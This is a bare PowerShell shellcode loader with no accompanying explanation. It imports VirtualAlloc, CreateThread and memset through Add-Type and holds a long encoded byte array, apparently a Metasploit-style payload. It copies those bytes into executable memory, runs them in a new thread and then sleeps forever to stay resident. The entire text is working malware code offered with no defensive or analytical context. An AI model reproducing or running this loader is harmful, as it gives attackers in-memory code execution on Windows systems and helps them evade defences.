$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xf3,0x83,0x8c,0xad,0xd9,0xf6,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x45,0x13,0x03,0x45,0x13,0x83,0xc5,0xf7,0x61,0x79,0x51,0x1f,0xe7,0x82,0xaa,0xdf,0x88,0x0b,0x4f,0xee,0x88,0x68,0x1b,0x40,0x39,0xfa,0x49,0x6c,0xb2,0xae,0x79,0xe7,0xb6,0x66,0x8d,0x40,0x7c,0x51,0xa0,0x51,0x2d,0xa1,0xa3,0xd1,0x2c,0xf6,0x03,0xe8,0xfe,0x0b,0x45,0x2d,0xe2,0xe6,0x17,0xe6,0x68,0x54,0x88,0x83,0x25,0x65,0x23,0xdf,0xa8,0xed,0xd0,0x97,0xcb,0xdc,0x46,0xac,0x95,0xfe,0x69,0x61,0xae,0xb6,0x71,0x66,0x8b,0x01,0x09,0x5c,0x67,0x90,0xdb,0xad,0x88,0x3f,0x22,0x02,0x7b,0x41,0x62,0xa4,0x64,0x34,0x9a,0xd7,0x19,0x4f,0x59,0xaa,0xc5,0xda,0x7a,0x0c,0x8d,0x7d,0xa7,0xad,0x42,0x1b,0x2c,0xa1,0x2f,0x6f,0x6a,0xa5,0xae,0xbc,0x00,0xd1,0x3b,0x43,0xc7,0x50,0x7f,0x60,0xc3,0x39,0xdb,0x09,0x52,0xe7,0x8a,0x36,0x84,0x48,0x72,0x93,0xce,0x64,0x67,0xae,0x8c,0xe0,0x44,0x83,0x2e,0xf0,0xc2,0x94,0x5d,0xc2,0x4d,0x0f,0xca,0x6e,0x05,0x89,0x0d,0x91,0x3c,0x6d,0x81,0x6c,0xbf,0x8e,0x8b,0xaa,0xeb,0xde,0xa3,0x1b,0x94,0xb4,0x33,0xa4,0x41,0x1a,0x64,0x0a,0x3a,0xdb,0xd4,0xea,0xea,0xb3,0x3e,0xe5,0xd5,0xa4,0x40,0x2c,0x7e,0x4e,0xba,0xa6,0x41,0x27,0xcb,0x84,0x2a,0x3a,0xd4,0xf9,0xf6,0xb3,0x32,0x93,0x16,0x92,0xed,0x0b,0x8e,0xbf,0x66,0xaa,0x4f,0x6a,0x03,0xec,0xc4,0x99,0xf3,0xa2,0x2c,0xd7,0xe7,0x52,0xdd,0xa2,0x5a,0xf4,0xe2,0x18,0xf0,0xf8,0x76,0xa7,0x53,0xaf,0xee,0xa5,0x82,0x87,0xb0,0x56,0xe1,0x9c,0x79,0xc3,0x4a,0xca,0x85,0x03,0x4b,0x0a,0xd0,0x49,0x4b,0x62,0x84,0x29,0x18,0x97,0xcb,0xe7,0x0c,0x04,0x5e,0x08,0x65,0xf9,0xc9,0x60,0x8b,0x24,0x3d,0x2f,0x74,0x03,0xbf,0x13,0xa3,0x6d,0xb5,0x7d,0x77;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};